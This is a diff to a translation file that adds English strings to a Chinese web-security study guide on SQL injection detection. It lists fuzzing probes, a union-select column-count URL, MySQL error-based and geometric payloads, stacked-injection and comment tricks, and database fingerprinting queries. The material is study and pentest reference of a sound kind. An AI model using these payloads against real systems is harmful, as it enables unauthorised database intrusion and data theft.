@@ -5,7 +5,7 @@
 #
 msgid ""
 msgstr ""
-"Project-Id-Version: Web安全学习笔记 1.0\n"
+"Project-Id-Version: Web Security Study Notes 1.0\n"
 "Report-Msgid-Bugs-To: \n"
 "POT-Creation-Date: 2026-06-17 07:02+0800\n"
 "PO-Revision-Date: YEAR-MO-DA HO:MI+ZONE\n"
@@ -20,179 +20,184 @@ msgstr ""
 
 #: ../../source/vuln/sql/fuzz.rst:2
 msgid "注入检测"
-msgstr ""
+msgstr "Injection Detection"
 
 #: ../../source/vuln/sql/fuzz.rst:5
 msgid "常见的注入点"
-msgstr ""
+msgstr "Common Injection Points"
 
 #: ../../source/vuln/sql/fuzz.rst:6
 msgid "GET/POST/PUT/DELETE参数"
-msgstr ""
+msgstr "GET/POST/PUT/DELETE parameters"
 
 #: ../../source/vuln/sql/fuzz.rst:7
 msgid "X-Forwarded-For"
-msgstr ""
+msgstr "X-Forwarded-For"
 
 #: ../../source/vuln/sql/fuzz.rst:8
 msgid "文件名"
-msgstr ""
+msgstr "File names"
 
 #: ../../source/vuln/sql/fuzz.rst:11
 msgid "Fuzz注入点"
-msgstr ""
+msgstr "Fuzz Injection Points"
 
 #: ../../source/vuln/sql/fuzz.rst:12
 msgid "``'`` / ``\"``"
-msgstr ""
+msgstr "``'`` / ``\"``"
 
 #: ../../source/vuln/sql/fuzz.rst:13
 msgid "``1/1``"
-msgstr ""
+msgstr "``1/1``"
 
 #: ../../source/vuln/sql/fuzz.rst:14
 msgid "``1/0``"
-msgstr ""
+msgstr "``1/0``"
 
 #: ../../source/vuln/sql/fuzz.rst:15
 msgid "``and 1=1``"
-msgstr ""
+msgstr "``and 1=1``"
 
 #: ../../source/vuln/sql/fuzz.rst:16
 msgid "``\" and \"1\"=\"1``"
-msgstr ""
+msgstr "``\" and \"1\"=\"1``"
 
 #: ../../source/vuln/sql/fuzz.rst:17
 msgid "``and 1=2``"
-msgstr ""
+msgstr "``and 1=2``"
 
 #: ../../source/vuln/sql/fuzz.rst:18
 msgid "``or 1=1``"
-msgstr ""
+msgstr "``or 1=1``"
 
 #: ../../source/vuln/sql/fuzz.rst:19
 msgid "``or 1=``"
-msgstr ""
+msgstr "``or 1=``"
 
 #: ../../source/vuln/sql/fuzz.rst:20
 msgid "``' and '1'='1``"
-msgstr ""
+msgstr "``' and '1'='1``"
 
 #: ../../source/vuln/sql/fuzz.rst:21
 msgid "``+`` ``-`` ``^`` ``*`` ``%`` ``/``"
-msgstr ""
+msgstr "``+`` ``-`` ``^`` ``*`` ``%`` ``/``"
 
 #: ../../source/vuln/sql/fuzz.rst:22
 msgid "``<<`` ``>>`` ``||`` ``|`` ``&`` ``&&``"
-msgstr ""
+msgstr "``<<`` ``>>`` ``||`` ``|`` ``&`` ``&&``"
 
 #: ../../source/vuln/sql/fuzz.rst:23
 msgid "``~``"
-msgstr ""
+msgstr "``~``"
 
 #: ../../source/vuln/sql/fuzz.rst:24
 msgid "``!``"
-msgstr ""
+msgstr "``!``"
 
 #: ../../source/vuln/sql/fuzz.rst:25
 msgid "``@``"
-msgstr ""
+msgstr "``@``"
 
 #: ../../source/vuln/sql/fuzz.rst:26
 msgid "反引号执行"
-msgstr ""
+msgstr "Backtick execution"
 
 #: ../../source/vuln/sql/fuzz.rst:29
 msgid "测试用常量"
-msgstr ""
+msgstr "Test Constants"
 
 #: ../../source/vuln/sql/fuzz.rst:30
 msgid "``@@version``"
-msgstr ""
+msgstr "``@@version``"
 
 #: ../../source/vuln/sql/fuzz.rst:31
 msgid "``@@servername``"
-msgstr ""
+msgstr "``@@servername``"
 
 #: ../../source/vuln/sql/fuzz.rst:32
 msgid "``@@language``"
-msgstr ""
+msgstr "``@@language``"
 
 #: ../../source/vuln/sql/fuzz.rst:33
 msgid "``@@spid``"
-msgstr ""
+msgstr "``@@spid``"
 
 #: ../../source/vuln/sql/fuzz.rst:36
 msgid "测试列数"
-msgstr ""
+msgstr "Testing the Column Count"
 
 #: ../../source/vuln/sql/fuzz.rst:37
 msgid ""
 "例如 ``http://www.foo.com/index.asp?id=12+union+select+null,null--`` ，不断增加 "
 "``null`` 至不返回"
 msgstr ""
+"For example, use "
+"``http://www.foo.com/index.asp?id=12+union+select+null,null--`` and keep "
+"adding ``null`` until no response is returned."
 
 #: ../../source/vuln/sql/fuzz.rst:40
 msgid "报错注入"
-msgstr ""
+msgstr "Error-Based Injection"
 
 #: ../../source/vuln/sql/fuzz.rst:41
 msgid "``select 1/0``"
-msgstr ""
+msgstr "``select 1/0``"
 
 #: ../../source/vuln/sql/fuzz.rst:42
 msgid ""
 "``select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from"
 "  information_schema.tables group by x)a``"
 msgstr ""
+"``select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from"
+"  information_schema.tables group by x)a``"
 
 #: ../../source/vuln/sql/fuzz.rst:43
 msgid "``extractvalue(1, concat(0x5c,(select user())))``"
-msgstr ""
+msgstr "``extractvalue(1, concat(0x5c,(select user())))``"
 
 #: ../../source/vuln/sql/fuzz.rst:44
 msgid "``updatexml(0x3a,concat(1,(select user())),1)``"
-msgstr ""
+msgstr "``updatexml(0x3a,concat(1,(select user())),1)``"
 
 #: ../../source/vuln/sql/fuzz.rst:45
 msgid "``exp(~(SELECT * from(select user())a))``"
-msgstr ""
+msgstr "``exp(~(SELECT * from(select user())a))``"
 
 #: ../../source/vuln/sql/fuzz.rst:46
 msgid "``ST_LatFromGeoHash((select * from(select * from(select user())a)b))``"
-msgstr ""
+msgstr "``ST_LatFromGeoHash((select * from(select * from(select user())a)b))``"
 
 #: ../../source/vuln/sql/fuzz.rst:47
 msgid "``GTID_SUBSET(version(), 1)``"
-msgstr ""
+msgstr "``GTID_SUBSET(version(), 1)``"
 
 #: ../../source/vuln/sql/fuzz.rst:50
 msgid "基于geometric的报错注入"
-msgstr ""
+msgstr "Geometric-Based Error Injection"
 
 #: ../../source/vuln/sql/fuzz.rst:51
 msgid "``GeometryCollection((select * from (select * from(select user())a)b))``"
-msgstr ""
+msgstr "``GeometryCollection((select * from (select * from(select user())a)b))``"
 
 #: ../../source/vuln/sql/fuzz.rst:52
 msgid "``polygon((select * from(select * from(select user())a)b))``"
-msgstr ""
+msgstr "``polygon((select * from(select * from(select user())a)b))``"
 
 #: ../../source/vuln/sql/fuzz.rst:53
 msgid "``multipoint((select * from(select * from(select user())a)b))``"
-msgstr ""
+msgstr "``multipoint((select * from(select * from(select user())a)b))``"
 
 #: ../../source/vuln/sql/fuzz.rst:54
 msgid "``multilinestring((select * from(select * from(select user())a)b))``"
-msgstr ""
+msgstr "``multilinestring((select * from(select * from(select user())a)b))``"
 
 #: ../../source/vuln/sql/fuzz.rst:55
 msgid "``LINESTRING((select * from(select * from(select user())a)b))``"
-msgstr ""
+msgstr "``LINESTRING((select * from(select * from(select user())a)b))``"
 
 #: ../../source/vuln/sql/fuzz.rst:56
 msgid "``multipolygon((select * from(select * from(select user())a)b))``"
-msgstr ""
+msgstr "``multipolygon((select * from(select * from(select user())a)b))``"
 
 #: ../../source/vuln/sql/fuzz.rst:58
 msgid ""
@@ -200,6 +205,10 @@ msgid ""
 "<https://github.com/mysql/mysql-"
 "server/commit/95825fa28a7e84a2f5dbdef5241078f7055c5b04>`_ 。"
 msgstr ""
+"Note that error-based injection using the exp function no longer works in "
+"MySQL versions after 5.5.49. For details, see `commit 95825f "
+"<https://github.com/mysql/mysql-"
+"server/commit/95825fa28a7e84a2f5dbdef5241078f7055c5b04>`_."
 
 #: ../../source/vuln/sql/fuzz.rst:60
 msgid ""
@@ -207,127 +216,131 @@ msgid ""
 "server/commit/5caea4a995130cd7c82574acc591ff7c46d9d978>`_ "
 "中被修复，在5.5.x较后的版本中同样不再生效。"
 msgstr ""
+"The geometric-based error injection techniques listed above were fixed in "
+"`commit 5caea4 <https://github.com/mysql/mysql-"
+"server/commit/5caea4a995130cd7c82574acc591ff7c46d9d978>`_ and likewise no "
+"longer work in later 5.5.x versions."
 
 #: ../../source/vuln/sql/fuzz.rst:63
 msgid "堆叠注入"
-msgstr ""
+msgstr "Stacked Injection"
 
 #: ../../source/vuln/sql/fuzz.rst:64
 msgid "``;select 1``"
-msgstr ""
+msgstr "``;select 1``"
 
 #: ../../source/vuln/sql/fuzz.rst:67
 msgid "注释符"
-msgstr ""
+msgstr "Comment Markers"
 
 #: ../../source/vuln/sql/fuzz.rst:68
 msgid "``#``"
-msgstr ""
+msgstr "``#``"
 
 #: ../../source/vuln/sql/fuzz.rst:69
 msgid "``--+``"
-msgstr ""
+msgstr "``--+``"
 
 #: ../../source/vuln/sql/fuzz.rst:70
 msgid "``/*xxx*/``"
-msgstr ""
+msgstr "``/*xxx*/``"
 
 #: ../../source/vuln/sql/fuzz.rst:71
 msgid "``/*!xxx*/``"
-msgstr ""
+msgstr "``/*!xxx*/``"
 
 #: ../../source/vuln/sql/fuzz.rst:72
 msgid "``/*!50000xxx*/``"
-msgstr ""
+msgstr "``/*!50000xxx*/``"
 
 #: ../../source/vuln/sql/fuzz.rst:75
 msgid "判断过滤规则"
-msgstr ""
+msgstr "Determining Filter Rules"
 
 #: ../../source/vuln/sql/fuzz.rst:76
 msgid "是否有trunc"
-msgstr ""
+msgstr "Whether truncation exists"
 
 #: ../../source/vuln/sql/fuzz.rst:77
 msgid "是否过滤某个字符"
-msgstr ""
+msgstr "Whether a specific character is filtered"
 
 #: ../../source/vuln/sql/fuzz.rst:78
 msgid "是否过滤关键字"
-msgstr ""
+msgstr "Whether keywords are filtered"
 
 #: ../../source/vuln/sql/fuzz.rst:79
 msgid "slash和编码"
-msgstr ""
+msgstr "Slashes and encoding"
 
 #: ../../source/vuln/sql/fuzz.rst:82
 msgid "获取信息"
-msgstr ""
+msgstr "Obtaining Information"
 
 #: ../../source/vuln/sql/fuzz.rst:83
 msgid "判断数据库类型"
-msgstr ""
+msgstr "Determining the database type"
 
 #: ../../source/vuln/sql/fuzz.rst:84
 msgid "``and exists (select * from msysobjects ) > 0`` access数据库"
-msgstr ""
+msgstr "``and exists (select * from msysobjects ) > 0`` Access database"
 
 #: ../../source/vuln/sql/fuzz.rst:85
 msgid "``and exists (select * from sysobjects ) > 0`` SQLServer数据库"
-msgstr ""
+msgstr "``and exists (select * from sysobjects ) > 0`` SQL Server database"
 
 #: ../../source/vuln/sql/fuzz.rst:87
 msgid "判断数据库表"
-msgstr ""
+msgstr "Determining database tables"
 
 #: ../../source/vuln/sql/fuzz.rst:88
 msgid "``and exsits (select * from admin)``"
-msgstr ""
+msgstr "``and exsits (select * from admin)``"
 
 #: ../../source/vuln/sql/fuzz.rst:90
 msgid "版本、主机名、用户名、库名"
-msgstr ""
+msgstr "Version, host name, user name, and database name"
 
 #: ../../source/vuln/sql/fuzz.rst:91
 msgid "表和字段"
-msgstr ""
+msgstr "Tables and fields"
 
 #: ../../source/vuln/sql/fuzz.rst:92
 msgid "确定字段数"
-msgstr ""
+msgstr "Determining the number of fields"
 
 #: ../../source/vuln/sql/fuzz.rst:93
 msgid "Order By"
-msgstr ""
+msgstr "Order By"
 
 #: ../../source/vuln/sql/fuzz.rst:94
 msgid "Select Into"
-msgstr ""
+msgstr "Select Into"
 
 #: ../../source/vuln/sql/fuzz.rst:95
 msgid "表名、列名"
-msgstr ""
+msgstr "Table names and column names"
 
 #: ../../source/vuln/sql/fuzz.rst:98
 msgid "测试权限"
-msgstr ""
+msgstr "Testing Privileges"
 
 #: ../../source/vuln/sql/fuzz.rst:99
 msgid "文件操作"
-msgstr ""
+msgstr "File operations"
 
 #: ../../source/vuln/sql/fuzz.rst:100
 msgid "读敏感文件"
-msgstr ""
+msgstr "Reading sensitive files"
 
 #: ../../source/vuln/sql/fuzz.rst:101
 msgid "写shell"
-msgstr ""
+msgstr "Writing a shell"
 
 #: ../../source/vuln/sql/fuzz.rst:102
 msgid "带外通道"
-msgstr ""
+msgstr "Out-of-band channels"
 
 #: ../../source/vuln/sql/fuzz.rst:103
 msgid "网络请求"
-msgstr ""
+msgstr "Network requests"
